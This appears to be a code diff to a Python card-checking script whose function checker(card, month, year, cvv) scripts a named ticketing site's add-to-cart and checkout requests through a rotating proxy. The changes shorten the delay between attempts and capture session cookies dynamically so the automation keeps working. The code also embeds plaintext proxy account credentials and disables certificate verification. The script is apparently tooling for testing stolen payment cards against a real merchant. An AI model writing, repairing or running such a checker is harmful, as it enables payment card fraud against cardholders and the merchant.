@@ -94,7 +94,7 @@ def checker(card, month, year, cvv):
 
         
         try:
-            time.sleep(4)
+            time.sleep(2)
             p = {'https': 'http://brd-customer-hl_b12cf4ef-zone-privado:6f2jb118cxl2@brd.superproxy.io:22225', 'http':'http://brd-customer-hl_b12cf4ef-zone-privado:6f2jb118cxl2@brd.superproxy.io:22225'}
             
             if len(year) == 4:
@@ -120,8 +120,10 @@ def checker(card, month, year, cvv):
                 'Cookie': 'allow_cookies="yes"; _gcl_au=1.1.2103056734.1712348265; _fbp=fb.1.1712348264986.1138458721; _pin_unauth=dWlkPVl6RTFNREk1Wm1ZdE9HVTRZeTAwTnpkakxUbGlOell0Tm1VMVlURm1Nemt3TVRSaA; _gid=GA1.2.404600766.1712440714; client_secure="I5YT8xAq2g2FN7v"; __utma=138453216.2130983608.1712348265.1712441874.1712441874.1; __utmc=138453216; __utmz=138453216.1712441874.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none); bpt="4UUd.4UUddS8s-1712451486473"; language="en_US"; locale="en_US"; _gat_UA-114148720-1=1; _ga_J4R614QWT5=GS1.1.1712450084.4.1.1712451540.5.0.0; _ga=GA1.2.2130983608.1712348265; _derived_epik=dj0yJnU9STZNZnEtVXZWSG5jbklWLVBUZE5scG51X1UyRzRVMngmbj12TnZMdnNFSWctVlM0MzVEVnItSkJnJm09MSZ0PUFBQUFBR1lSNzlZJnJtPTEmcnQ9QUFBQUFHWVI3OVkmc3A9Mg; _ga_W3XK1HZ6LH=GS1.1.1712450080.4.1.1712451544.0.0.0',
                 'Content-Type': 'application/x-www-form-urlencoded'
                 }
-            response = requests.request("POST", url, headers=headers, data=payload, verify=False, proxies=p, timeout=100)
-                        
+            response = requests.request("POST", url, headers=headers, data=payload, verify=False, proxies=p, timeout=100, allow_redirects=False)
+            client = response.cookies.get('client_secure') 
+            bpt = response.cookies.get('bpt')
+            
             
             url = "https://www.brownpapertickets.com/addtocart/6280892"
             payload = 'event_id=6280892&date_id=2404336&price_7645526=1&price_7645527=0&country_id=228&shipping_2404336=4&shipping_2404337=4'
@@ -141,7 +143,7 @@ def checker(card, month, year, cvv):
                 'Sec-Fetch-Dest': 'document',
                 'Referer': 'https://www.brownpapertickets.com/event/6280892',
                 'Accept-Language': 'pt-PT,pt;q=0.9,en-US;q=0.8,en;q=0.7',
-                'Cookie': 'allow_cookies="yes"; _gcl_au=1.1.2103056734.1712348265; _fbp=fb.1.1712348264986.1138458721; _pin_unauth=dWlkPVl6RTFNREk1Wm1ZdE9HVTRZeTAwTnpkakxUbGlOell0Tm1VMVlURm1Nemt3TVRSaA; _gid=GA1.2.404600766.1712440714; __utma=138453216.2130983608.1712348265.1712441874.1712441874.1; __utmc=138453216; __utmz=138453216.1712441874.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none); language="en_US"; locale="en_US"; client_secure="AIp9Esf64tLWPpA"; _gat_UA-114148720-1=1; bpt="ABqN.4UUddS8s-1712451486473"; _ga_J4R614QWT5=GS1.1.1712450084.4.1.1712451577.30.0.0; _ga=GA1.2.2130983608.1712348265; _derived_epik=dj0yJnU9T2RGTjVHSFdITG9feE9vR2dFNngwYVdaaEtfVHNTN3Umbj1Fa3N6M1JMZUdKMG9ySExoSFhOWWpnJm09MSZ0PUFBQUFBR1lSN19zJnJtPTEmcnQ9QUFBQUFHWVI3X3Mmc3A9Mg; _ga_W3XK1HZ6LH=GS1.1.1712450080.4.1.1712451586.0.0.0',
+                'Cookie': f'allow_cookies="yes"; _gcl_au=1.1.2103056734.1712348265; _fbp=fb.1.1712348264986.1138458721; _pin_unauth=dWlkPVl6RTFNREk1Wm1ZdE9HVTRZeTAwTnpkakxUbGlOell0Tm1VMVlURm1Nemt3TVRSaA; _gid=GA1.2.404600766.1712440714; __utma=138453216.2130983608.1712348265.1712441874.1712441874.1; __utmc=138453216; __utmz=138453216.1712441874.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none); language="en_US"; locale="en_US"; client_secure={client}; _gat_UA-114148720-1=1; bpt={bpt}; _ga_J4R614QWT5=GS1.1.1712450084.4.1.1712451577.30.0.0; _ga=GA1.2.2130983608.1712348265; _derived_epik=dj0yJnU9T2RGTjVHSFdITG9feE9vR2dFNngwYVdaaEtfVHNTN3Umbj1Fa3N6M1JMZUdKMG9ySExoSFhOWWpnJm09MSZ0PUFBQUFBR1lSN19zJnJtPTEmcnQ9QUFBQUFHWVI3X3Mmc3A9Mg; _ga_W3XK1HZ6LH=GS1.1.1712450080.4.1.1712451586.0.0.0',
                 'Content-Type': 'application/x-www-form-urlencoded'
                 }
             response = requests.request("POST", url, headers=headers, data=payload, verify=False, proxies=p, timeout=100)
@@ -168,7 +170,7 @@ def checker(card, month, year, cvv):
                     'Sec-Fetch-Dest': 'document',
                     'Referer': 'https://www.brownpapertickets.com/checkout.html',
                     'Accept-Language': 'pt-PT,pt;q=0.9,en-US;q=0.8,en;q=0.7',
-                    'Cookie': 'allow_cookies="yes"; _gcl_au=1.1.2103056734.1712348265; _fbp=fb.1.1712348264986.1138458721; _pin_unauth=dWlkPVl6RTFNREk1Wm1ZdE9HVTRZeTAwTnpkakxUbGlOell0Tm1VMVlURm1Nemt3TVRSaA; _gid=GA1.2.404600766.1712440714; __utma=138453216.2130983608.1712348265.1712441874.1712441874.1; __utmc=138453216; __utmz=138453216.1712441874.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none); language="en_US"; locale="en_US"; client_secure="AIp9Esf64tLWPpA"; _gat_UA-114148720-1=1; bpt="ABqN.4UUddS8s-1712451486473"; _ga_J4R614QWT5=GS1.1.1712450084.4.1.1712451577.30.0.0; _ga=GA1.2.2130983608.1712348265; _derived_epik=dj0yJnU9T2RGTjVHSFdITG9feE9vR2dFNngwYVdaaEtfVHNTN3Umbj1Fa3N6M1JMZUdKMG9ySExoSFhOWWpnJm09MSZ0PUFBQUFBR1lSN19zJnJtPTEmcnQ9QUFBQUFHWVI3X3Mmc3A9Mg; _ga_W3XK1HZ6LH=GS1.1.1712450080.4.1.1712451586.0.0.0',
+                    'Cookie': f'allow_cookies="yes"; _gcl_au=1.1.2103056734.1712348265; _fbp=fb.1.1712348264986.1138458721; _pin_unauth=dWlkPVl6RTFNREk1Wm1ZdE9HVTRZeTAwTnpkakxUbGlOell0Tm1VMVlURm1Nemt3TVRSaA; _gid=GA1.2.404600766.1712440714; __utma=138453216.2130983608.1712348265.1712441874.1712441874.1; __utmc=138453216; __utmz=138453216.1712441874.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none); language="en_US"; locale="en_US"; client_secure={client}; _gat_UA-114148720-1=1; bpt={bpt}; _ga_J4R614QWT5=GS1.1.1712450084.4.1.1712451577.30.0.0; _ga=GA1.2.2130983608.1712348265; _derived_epik=dj0yJnU9T2RGTjVHSFdITG9feE9vR2dFNngwYVdaaEtfVHNTN3Umbj1Fa3N6M1JMZUdKMG9ySExoSFhOWWpnJm09MSZ0PUFBQUFBR1lSN19zJnJtPTEmcnQ9QUFBQUFHWVI3X3Mmc3A9Mg; _ga_W3XK1HZ6LH=GS1.1.1712450080.4.1.1712451586.0.0.0',
                     'Content-Type': 'application/x-www-form-urlencoded'
                     }
 
